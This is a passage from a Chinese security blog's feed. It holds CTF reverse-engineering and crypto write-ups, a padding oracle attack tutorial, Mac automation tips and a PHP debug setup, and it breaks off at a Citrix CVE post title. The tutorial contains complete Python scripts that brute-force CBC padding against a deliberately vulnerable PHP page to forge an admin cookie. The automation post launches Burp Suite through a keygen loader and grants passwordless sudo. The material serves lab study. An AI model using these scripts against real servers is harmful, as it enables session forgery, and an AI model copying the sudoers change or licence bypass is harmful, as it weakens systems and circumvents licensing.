byte_6CC0A0[0]  HIBYTE(v15) ^ byte_6CC0A3 == 0xAA ^ byte_6CC0A3 // HIBYTE 提取16bit数的高8bit</code></pre><p>前面提示了flag的前四位为flag</p><p>所以</p><p>Byte_6CC0A0 ^ v15 == flag…..</p><pre><code class="bash">In [5]: a = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x   ...: 62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B]In [6]: v15 = [a[0] ^ ord(&#39;f&#39;),a[1] ^ ord(&#39;l&#39;),a[2] ^ ord(&#39;a&#39;),a[3] ^ ord(&#39;g&#39;)]In [7]: flag = &#39;&#39;   ...: for i in range(len(a)):   ...:     flag += chr(a[i] ^ v15[i%4])   ...:In [8]: flagOut[8]: &#39;flag{Act1ve_Defen5e_Test}&#39;</code></pre></li></ol><h2 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h2><p><img src="/images/BUUCTF-RE.assets/image-20200430103624213.png" srcset="/img/loading.gif" alt="image-20200430103624213"></p><p>在线提取pq</p><p><img src="/images/BUUCTF-RE.assets/image-20200430103400951.png" srcset="/img/loading.gif" alt="image-20200430103400951"></p><p>代码如下</p><pre><code class="python">import base64p= 282164587459512124844245113950593348271q= 366669102002966856876605669837014229419e= 65537c= 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35n= 103461035900816914121390101299049044413950405173712170434161686539878160984549def egcd(a, b):    if a == 0:        return (b, 0, 1)    else:        g, y, x = egcd(b % a, a)        return (g, x - (b // a) * y, y)def modinv(a, m):    g, x, y = egcd(a, m)    if g != 1:        raise Exception(&#39;modular inverse does not exist&#39;)    else:        return x % md=modinv(e,(p-1)*(q-1))print &#39;d=&#39;,dm=pow(c,d,n)print hex(m)[2:len(hex(m))-1].decode(&#39;hex&#39;)# suctf{Pwn_@_hundred_years}</code></pre><p>涉及的GNU高精度算法库</p><p><a href="https://gmplib.org/manual/" target="_blank" rel="noopener">https://gmplib.org/manual/</a></p><h2 id="V-amp-N2020-公开赛-strangeCpp-藏数据"><a href="#V-amp-N2020-公开赛-strangeCpp-藏数据" class="headerlink" title="[V&amp;N2020 公开赛]strangeCpp-藏数据"></a>[V&amp;N2020 公开赛]strangeCpp-藏数据</h2><p>主体作用就是输出系统信息，看了半天不知道数据在哪里加密的，查看wp后，知道了</p><pre><code class="c">__int64 __fastcall sub_140013AA0(__int64 a1, __int64 a2, __int64 *a3){  char *v3; // rdi  signed __int64 i; // rcx  __int64 v5; // rax  __int64 v6; // rax  __int64 v7; // rax  __int64 v8; // rax  char v10; // [rsp+0h] [rbp-20h]  struct _SYSTEM_INFO SystemInfo; // [rsp+28h] [rbp+8h]  __int64 *j; // [rsp+78h] [rbp+58h]  __int64 v13; // [rsp+98h] [rbp+78h]  __int64 *v14; // [rsp+1A0h] [rbp+180h]  v14 = a3;  v3 = &amp;v10;  for ( i = 94i64; i; --i )  {    *v3 = -858993460;    v3 += 4;  }  sub_1400110AA(&amp;unk_140027033);  GetSystemInfo(&amp;SystemInfo);  putchar(unk_140021004[0]);  putchar(unk_140021004[1]);  putchar(unk_140021004[2]);  putchar(unk_140021004[3]);  putchar(unk_140021015[4]);  putchar(unk_140021015[5]);  putchar(unk_140021004[1]);  putchar(10);  puts(&quot;Let me have a look at your computer...&quot;);  for ( j = v14; *j; ++j )  {    v13 = *j;    sub_140011226(&quot;%s\n&quot;, v13);  }  std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(std::cout, sub_140011127);  dword_140021190 = SystemInfo.dwNumberOfProcessors;  sub_140011226(&quot;now system cpu num is %d\n&quot;, SystemInfo.dwNumberOfProcessors);  if ( dword_140021190 &gt;= 8 )  {    puts(&quot;Are you in VM?&quot;);    _exit(0);  }  if ( GetUserNameA(Str1, &amp;unk_140021000) )  {    v5 = sub_140011172(std::cout, &quot;this is useful&quot;);    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, sub_140011127);  }  v6 = std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(std::cout, sub_140011127);  v7 = sub_140011172(v6, &quot;ok,I am checking...&quot;);  std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v7, sub_140011127);  if ( !j_strcmp(Str1, &quot;cxx&quot;) )  {    v8 = sub_140011172(std::cout, &quot;flag{where_is_my_true_flag?}&quot;);    std::basic_ostream&lt;char,std::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v8, sub_140011127);    _exit(0);  }  system(&quot;pause&quot;);  sub_1400113E3(&amp;v10, &amp;unk_14001DE50);  return 0i64;}</code></pre><p>与flag相关的数据都没用，简直脑洞</p><p>welcome数据中夹杂其他数据</p><p><img src="/images/BUUCTF-RE.assets/image-20200430125512331.png" srcset="/img/loading.gif" alt="image-20200430125512331"></p><p>点击查看数据</p><p><img src="/images/BUUCTF-RE.assets/image-20200430125528305.png" srcset="/img/loading.gif" alt="image-20200430125528305"></p><p>使用交叉引用定位函数</p><p><img src="/images/BUUCTF-RE.assets/image-20200430125551975.png" srcset="/img/loading.gif" alt="image-20200430125551975"></p><p>主要是for循环处，byte xor 直接爆破</p><pre><code class="python">In [1]: flag = [0x26, 0x2C, 0x21, 0x27, 0x3B, 0x0D, 0x04, 0x75, 0x68, 0x34, 0x28, 0x25,   ...:  0x0E, 0x35, 0x2D, 0x69, 0x3D]In [2]: for i in range(0,256):   ...:     s = &#39;&#39;   ...:     for j in flag:   ...:         s += chr(i^j)   ...:     print s...flag{MD5(theNum)}...</code></pre><p>theNum为知，可能是需要计算dword_140021190</p><p><code>sub_140011384(dword_140021190) = 0x242EE21A</code></p><pre><code class="c">signed __int64 __fastcall sub_140013890(int a1){  __int64 *v1; // rdi  signed __int64 i; // rcx  signed __int64 result; // rax  __int64 v4; // [rsp+0h] [rbp-20h]  int v5; // [rsp+24h] [rbp+4h]  int v6; // [rsp+44h] [rbp+24h]  unsigned int v7; // [rsp+64h] [rbp+44h]  int v8; // [rsp+160h] [rbp+140h]  v8 = a1;  v1 = &amp;v4;  for ( i = 82i64; i; --i )  {    *v1 = -858993460;    v1 = (v1 + 4);  }  sub_1400110AA(&amp;unk_140027033);  v5 = v8 &gt;&gt; 12;  v6 = v8 &lt;&lt; 8;  v7 = (v8 &lt;&lt; 8) ^ (v8 &gt;&gt; 12);  v7 *= 291;  if ( v7 )    result = v7;  else    result = 0x3DBi64;  return result;}</code></pre><p>主要代码</p><pre><code class="c">v7 = (v8 &lt;&lt; 8) ^ (v8 &gt;&gt; 12);v7 *= 291;v7 == 0x242EE21A</code></pre><p>代码如下</p><pre><code class="python">In [9]: for i in range(0,9999999999):   ...:     if (((i &lt;&lt; 8) ^ (i &gt;&gt; 12)) * 291) &amp; 0xffffffff == 0x242EE21A:   ...:         print i   ...:         break   ...:123456</code></pre><p>MD5加密</p><pre><code class="bash">┌[bufsnake☮ bufsnake.com]-(~)└&gt; echo &#39;123456\c&#39; | md5e10adc3949ba59abbe56e057f20f883e</code></pre><p>Flag: flag{e10adc3949ba59abbe56e057f20f883e}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;不一样的flag&quot;&gt;&lt;a href=&quot;#不一样的flag&quot; class=&quot;headerlink&quot; title=&quot;不一样的flag&quot;&gt;&lt;/a&gt;不一样的flag&lt;/h2&gt;&lt;p&gt;ida F5得到伪代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/BUUCTF-RE
      
    
    </summary>
    
      <category term="reverse" scheme="https://bufsnake.github.io/categories/reverse/"/>
    
    
      <category term="buuctf" scheme="https://bufsnake.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>CBC加密模式攻击-集成题目</title>
    <link href="https://bufsnake.github.io/CBC%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E6%94%BB%E5%87%BB-%E9%9B%86%E6%88%90%E9%A2%98%E7%9B%AE.html"/>
    <id>https://bufsnake.github.io/CBC加密模式攻击-集成题目.html</id>
    <published>2020-04-27T03:35:21.000Z</published>
    <updated>2020-04-27T03:43:25.492Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目来源：[NPUCTF2020]web BUU已经有了</p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>打开链接得到源码</p><p>测试加密</p><p>得到</p><p>IV:6666666666666666</p><p>ly7auKVQCZWum/W/4osuPA==</p><p><img src="/images/pasted-249.png" srcset="/img/loading.gif" alt="upload successful"></p><p>测试解密，得到 1<br>这里的</p><pre><code class="php">return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(&#39;False&#39;);</code></pre><p>运用短路运算，要么返回 1 要么返回 False</p><p>所以利用点为padding oracle attack</p><p><img src="/images/pasted-250.png" srcset="/img/loading.gif" alt="upload successful"></p><p>脚本如下</p><p><img src="/images/pasted-251.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结果如下</p><p><img src="/images/pasted-252.png" srcset="/img/loading.gif" alt="upload successful"></p><p>得到第二关的地址：FlagIsHere.php</p><p><img src="/images/pasted-253.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>访问FlagIsHere.php得到源码</p><p><img src="/images/pasted-254.png" srcset="/img/loading.gif" alt="upload successful"></p><p>由源码可知</p><pre><code class="php">$lalala = &#39;piapiapiapia&#39;;$iv = base64_decode(&#39;JwaFITevixiv4BbxHCph7A==&#39;);$tmp_id = &#39;weber&#39;;</code></pre><p>所以可以得到下面公式：</p><p><img src="/images/pasted-257.png" srcset="/img/loading.gif" alt="upload successful"></p><p>脚本如下：</p><p><img src="/images/pasted-255.png" srcset="/img/loading.gif" alt="upload successful"></p><p>结果如下：</p><p><img src="/images/pasted-256.png" srcset="/img/loading.gif" alt="upload successful"></p><p>由于得到的连接失效了，所以就没有继续下去</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;题目来源：[NPUCTF2020]web BUU已经有了&lt;/p&gt;
&lt;h2 id=&quot;第一关&quot;&gt;&lt;a href=&quot;#第一关&quot; class=&quot;he
      
    
    </summary>
    
      <category term="web" scheme="https://bufsnake.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://bufsnake.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Padding Oracle Attack</title>
    <link href="https://bufsnake.github.io/Padding-Oracle-Attack.html"/>
    <id>https://bufsnake.github.io/Padding-Oracle-Attack.html</id>
    <published>2020-04-23T11:16:57.000Z</published>
    <updated>2020-04-23T11:16:05.166Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code class="bash">1、在ECB模式的基础上，增强了块与块之间的联系。2、明文块先与IV XOR运算后，在进行加密，得到的密文充当下一个明文区块的IV...3、明文块填充方式，如果明文为abcd，长度为4，则需要填充12位，12的十六进制为\x0C，在最后加密的明文为abcd\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C</code></pre><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p><img src="/images/pasted-239.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p><img src="/images/pasted-240.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="padding-Oracle-attack"><a href="#padding-Oracle-attack" class="headerlink" title="padding Oracle attack"></a>padding Oracle attack</h4><p><code>密文最后一个区块</code>通过<code>block cipher encryption</code>解密，得到<code>中间密文</code>，<code>中间密文</code>与<code>IV</code>异或得到明文。</p><p>如果输入错误的IV，也是可以解密的，但是<code>中间密文</code>和<code>错误的IV</code>异或后得到的填充值可能出现错误，那程序就会抛出(Padding Error)。</p><ul><li>第一步：填充错误</li></ul><p><img src="/images/pasted-241.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li>第二步：填充正确，填充为01</li></ul><p><img src="/images/pasted-242.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li>第三步：填充为0202</li></ul><p><img src="/images/pasted-243.png" srcset="/img/loading.gif" alt="upload successful"></p><ul><li><p>后续</p><p>正确的padding值只可能为：<br>1个字节的padding为<strong>0x01</strong><br>2个字节的padding为<strong>0x02,0x02</strong><br>3个字节的padding为<strong>0x03,0x03,0x03</strong><br>4个字节的padding为<strong>0x04,0x04,0x04,0x04</strong></p><p>……</p></li><li><p>以此类推，可以推导出所有的<code>中间密文</code>，<code>中间密文</code>的第一位需要爆破</p></li><li><p>控制<code>IV</code>可以将密文解密成任意明文(现在已知中间密文、可控IV)</p></li></ul><h5 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h5><pre><code class="php">// index.php&lt;?phperror_reporting(0);include(&#39;./key.php&#39;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);define(&quot;SECRET_KEY&quot;, $secret_key);session_start();function get_random_token(){    $random_token=&#39;&#39;;    for($i=0;$i&lt;16;$i++){        $random_token.=chr(rand(1,255));    }    return $random_token;}function get_identity(){    $defaultID = &quot;heheda&quot;;    $token = get_random_token();    $_SESSION[&#39;id&#39;] = base64_encode(openssl_encrypt($defaultID, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token));    setcookie(&quot;token&quot;, base64_encode($token));    $_SESSION[&#39;isadmin&#39;] = false;}function is_admin(){    if(isset($_SESSION[&#39;id&#39;])){        $token = base64_decode($_COOKIE[&#39;token&#39;]);        if($id = openssl_decrypt(base64_decode($_SESSION[&#39;id&#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)){            if($id == &quot;admin&quot;)                $_SESSION[&#39;isadmin&#39;] = true;        } else {            die(&quot;Error!&quot;);        }    }}if(!isset($_SESSION[&#39;id&#39;]))    get_identity();else {    is_admin();    if ($_SESSION[&quot;isadmin&quot;]){        echo &quot;You are admin!\n&quot;;        echo $flag;    }else        echo &quot;You are not admin!\n&quot;;}highlight_file(__file__);?&gt;// key.php&lt;?phpsession_start();$secret_key = &#39;teg2f4z5f7f5a2c1&#39;;$flag = &quot;flag{padding_oracle_attack_is_easy}&quot;;?&gt;</code></pre><ul><li><p>分析代码，可以看到关键点</p><p><img src="/images/pasted-244.png" srcset="/img/loading.gif" alt="upload successful"></p><p>解密时，如果出现Padding Error，则网页会显示Error!，否则会判断解密后的明文是否为admin。</p></li><li><p>判断<code>中间密文</code>的最后一字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*15 + chr(i)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-245.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0x3b ^ 0x1 = 0x3a</p></li><li><p>判断<code>中间密文</code>的倒数第二个字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*14 + chr(i) + chr(0x3b^0x1^0x2)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-246.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0x1a ^ 0x2 = 0x18</p></li><li><p>判断<code>中间密文</code>的倒数第三个字节</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;for i in range(1,256):    token = &#39;\x00&#39;*13 + chr(i) + chr(0x1a^0x2^0x3) + chr(0x3b^0x1^0x2^0x2^0x3)    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:        print hex(i)</code></pre><p><img src="/images/pasted-247.png" srcset="/img/loading.gif" alt="upload successful"></p><p>这样就可以知道中间密文的最后一字节为0xd2 ^ 0x3 = 0xd1</p></li><li><p>以此类推</p><pre><code class="python">import requestsimport base64url = &#39;http://127.0.0.1/index.php&#39;token_temp = &#39;&#39;for j in range(1,17):    for i in range(1,256):        token = &#39;\x00&#39;*(16-j) + chr(i) + token_temp        cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}        if &quot;Error!&quot; not in requests.get(url,cookies=cookie).content:            token_temp = chr(i ^ j ^ (j+1)) + token_temp            temp = &#39;&#39;            for i in range(1,len(token_temp)):                temp += chr(ord(token_temp[i]) ^ j ^ (j+1))            token_temp = token_temp[0] + temp            breakmiddle = &#39;&#39;for i in range(len(token_temp)):    middle += chr(ord(token_temp[i]) ^ 16)for i in range(1,256):    temp_middle = chr(i) + middle    plain = &#39;admin&#39; + &#39;\x0b&#39;*11    token = &#39;&#39;    for i in range(len(plain)):        token += chr(ord(temp_middle[i]) ^ ord(plain[i]))    cookie = {&#39;token&#39;:base64.b64encode(token).replace(&quot;=&quot;,&quot;%3d&quot;).replace(&#39;/&#39;,&#39;%2f&#39;).replace(&#39;+&#39;,&#39;%2B&#39;),&quot;PHPSESSID&quot;:&quot;gaqekj8shscuprbvdfim9hcgj0&quot;}    if &#39;admin&#39; in requests.get(url,cookies=cookie).content:        print requests.get(url,cookies=cookie).content        break</code></pre><p><img src="/images/pasted-248.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;1、在ECB模式的基础上，增强了块与块之间的联系。
2、明文块先与IV XOR运算后，在进行加密，
      
    
    </summary>
    
    
      <category term="padding oracle attack" scheme="https://bufsnake.github.io/tags/padding-oracle-attack/"/>
    
  </entry>
  
  <entry>
    <title>Mac 自动操作的极致体验</title>
    <link href="https://bufsnake.github.io/Mac-%E8%87%AA%E5%8A%A8%E6%93%8D%E4%BD%9C%E7%9A%84%E6%9E%81%E8%87%B4%E4%BD%93%E9%AA%8C.html"/>
    <id>https://bufsnake.github.io/Mac-自动操作的极致体验.html</id>
    <published>2020-03-20T02:24:51.000Z</published>
    <updated>2020-03-21T10:55:54.622Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>常用的jar包常常需要用掉一个终端页面，或是<code>&amp;&gt;&gt;/dev/null &amp;</code>后台运行，但是当前页面一但关闭，程序也就随之关闭，很是苦恼。</p></blockquote><blockquote><p>使用burpsuite的时候，发现<a href="https://www.sqlsec.com/2019/11/macbp.html" target="_blank" rel="noopener">国光</a>大佬发的一篇有趣的文章，遂尝试了一下。成果图如下</p></blockquote><p><img src="/images/pasted-222.png" srcset="/img/loading.gif" alt="upload successful"></p><p>按照操作，出现了点问题，如下：</p><p><img src="/images/pasted-223.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="php">操作“运行 Shell 脚本”遇到了错误：“Error: Unable to access jarfile burp-loader-keygen-2020_2.jar”Error: Unable to access jarfile burp-loader-keygen-2020_2.jar</code></pre><p>Google了一波，都说是内存分配原因，但是在iterm2中运行却没事，想到会不会是环境的问题，然后就在终端运行了</p><pre><code class="bash">➜  burpsuite2020.02 export |grep &quot;JAVA&quot;JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home</code></pre><p>，找到唯一和java相关的环境变量，写到 <code>运行Shell脚本</code></p><pre><code class="bash">export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home &amp;&amp; cd /Users/bufsnake/Web-Pentest/burpsuite2020.02 &amp;&amp; java -noverify -Xbootclasspath/p:burp-loader-keygen-2020_2.jar -jar burpsuite_pro_v2020.2.jar</code></pre><p>运行成功</p><p><img src="/images/pasted-224.png" srcset="/img/loading.gif" alt="upload successful"></p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ol><li>在之前，macos运行goby的时候，由于macos权限控制的比较狗，所以goby申请一些权限不过就会会卡住，如下图<br><img src="/images/pasted-225.png" srcset="/img/loading.gif" alt="upload successful"></li><li>iterm2中用sudo运行goby就可以进去(root权限)<br><img src="/images/pasted-226.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-227.png" srcset="/img/loading.gif" alt="upload successful"></li><li><p>然后就用了 自动操作 制作了一个app，发现goby真香</p><ul><li><p>设置sudo不需要输入密码</p><pre><code class="bash">➜  MacOS sudo cat /etc/sudoers...# root and users in group wheel can run anything on any machine as any userroot        ALL = (ALL) ALL%admin        ALL = (ALL) NOPASSWD:ALL...</code></pre><ul><li><p>注意点</p><p>a. 使用超级权限编辑/etc/sudoers，vim编辑后，然后键入:wq!，保存</p><p>b. 如果配置错误，sudo命令就会报错</p><pre><code class="bash">➜  MacOS sudo&gt;&gt;&gt; /etc/sudoers: syntax error near line 2 &lt;&lt;&lt;sudo: parse error in /etc/sudoers near line 2sudo: no valid sudoers sources found, quittingsudo: unable to initialize policy plugin</code></pre><ul><li>解决方法如下<br><img src="/images/pasted-228.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-229.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-230.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-231.png" srcset="/img/loading.gif" alt="upload successful"><br>重新编辑/etc/sudoers文件，当前权限就行，更改完之后，记得，将文件的权限还原，否则如下:<pre><code class="bash">➜  MacOS sudo vimsudo: /etc/sudoers is world writablesudo: no valid sudoers sources found, quittingsudo: unable to initialize policy plugin         </code></pre></li></ul></li></ul></li><li>设置 <code>运行 Shell 脚本</code><br><img src="/images/pasted-232.png" srcset="/img/loading.gif" alt="upload successful"><br><img src="/images/pasted-233.png" srcset="/img/loading.gif" alt="upload successful"><br>这样设置，很是舒服，有个小问题<br><img src="/images/pasted-234.png" srcset="/img/loading.gif" alt="upload successful"><br>可以在脚本后面键入<code>&amp;&gt;&gt;/dev/null &amp;</code>，就非常完美了<br><img src="/images/pasted-235.png" srcset="/img/loading.gif" alt="upload successful"></li><li>图标可以从goby.app中直接获取<br><img src="/images/pasted-236.png" srcset="/img/loading.gif" alt="upload successful"></li><li>成品图<br><img src="/images/pasted-237.png" srcset="/img/loading.gif" alt="upload successful"></li><li><p>测试扫描</p><p><code>注:</code>需要指定网卡<br><img src="/images/pasted-238.png" srcset="/img/loading.gif" alt="upload successful"><br><code>真香</code></p></li></ul></li></ol><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>通过此方法，又设置了几个软件，不用每次都依赖终端了，需要注意的是，文件的路径不要轻易改变，不然会打不开，还要重新制作，浪费时间。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;常用的jar包常常需要用掉一个终端页面，或是&lt;code&gt;&amp;amp;&amp;gt;&amp;gt;/dev/null &amp;amp;&lt;
      
    
    </summary>
    
      <category term="misc" scheme="https://bufsnake.github.io/categories/misc/"/>
    
    
      <category term="mac" scheme="https://bufsnake.github.io/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>Mac PHP调试环境搭建</title>
    <link href="https://bufsnake.github.io/Mac-PHP%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"/>
    <id>https://bufsnake.github.io/Mac-PHP调试环境搭建.html</id>
    <published>2020-03-19T01:22:03.000Z</published>
    <updated>2020-03-19T01:54:38.316Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>需要的工具<code>MxSrvs</code>、<code>PHPStorm</code>、<code>Xdebug helper</code></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="MxSrvs"><a href="#MxSrvs" class="headerlink" title="MxSrvs"></a>MxSrvs</h3><ol><li><p>启动软件</p><p><img src="/images/pasted-209.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>打开配置编辑，编辑php.ini</p><p><img src="/images/pasted-210.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>配置Xdebug</p><p><code>MxSrvs</code>默认自带Xdebug，不需要去下载，配置如下图:</p><p><img src="/images/pasted-211.png" srcset="/img/loading.gif" alt="upload successful"></p><pre><code class="bash">[xdebug]zend_extension = &quot;/Applications/MxSrvs/bin/php/ext/xdebug.so&quot;xdebug.remote_enable=1xdebug.remote_connect_back=1xdebug.var_display_max_depth = 512xdebug.profiler_append = 1xdebug.profiler_enable_trigger = 1xdebug.max_nesting_level = 200xdebug.profiler_output_dir = &quot;/Applications/MxSrvs/logs/xdebug&quot;xdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;xdebug.idekey=&#39;PHPSTORM&#39;  # sessionkeyxdebug.remote_port=9000   #</code></pre></li><li><p>查看phpinfo信息</p><p><img src="/images/pasted-216.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ol><h3 id="PHPStorm"><a href="#PHPStorm" class="headerlink" title="PHPStorm"></a>PHPStorm</h3><p><code>设置PHPStorm的Xdebug端口，端口由xdebug.remote_port决定</code></p><p><img src="/images/pasted-212.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-213.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="Xdebug-helper-Chrome插件"><a href="#Xdebug-helper-Chrome插件" class="headerlink" title="Xdebug helper(Chrome插件)"></a>Xdebug helper(Chrome插件)</h3><ol><li><p>在Chrome插件商店下载安装即可</p><p><img src="/images/pasted-214.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>配置Xdebug Helper</p><p><code>IDE key由xdebug.idekey决定</code></p><p><img src="/images/pasted-215.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ol><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ol><li><p>在网站根目录添加一个PHP文件</p><p><img src="/images/pasted-217.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>开启监听</p><p><img src="/images/pasted-218.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>开启Xdebug Helper</p><p><img src="/images/pasted-219.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>刷新网页，phpstorm会提示以下内容，同意即可：</p><p><img src="/images/pasted-220.png" srcset="/img/loading.gif" alt="upload successful"></p></li><li><p>提示Debug session was finished without being paused</p><p>需要设置断点，然后刷新网页，就会显示如下界面。</p><p><img src="/images/pasted-221.png" srcset="/img/loading.gif" alt="upload successful"></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;需要的工具&lt;code&gt;MxSrvs&lt;/code&gt;、&lt;code&gt;PHPStorm&lt;/code&gt;、&lt;code&gt;Xdebug helper&lt;/co
      
    
    </summary>
    
      <category term="web" scheme="https://bufsnake.github.io/categories/web/"/>
    
    
      <category term="php调试环境搭建" scheme="https://bufsnake.github.io/tags/php%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-19781:Citrix路径遍历复现</title>
    <link href="https://bufsnake.github.io/CVE-2019-19781-Citrix%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E5%A4%8D%E7%8E%B0.html"/>
    <id>https://bufsnake.github.io/CVE-2019-19781-Citrix路径遍历复现.html</id>
    <published>2020-01-09T11:11:08.000Z</published>
    <updated>2020-01-09T11:22:57.717Z</updated>
    
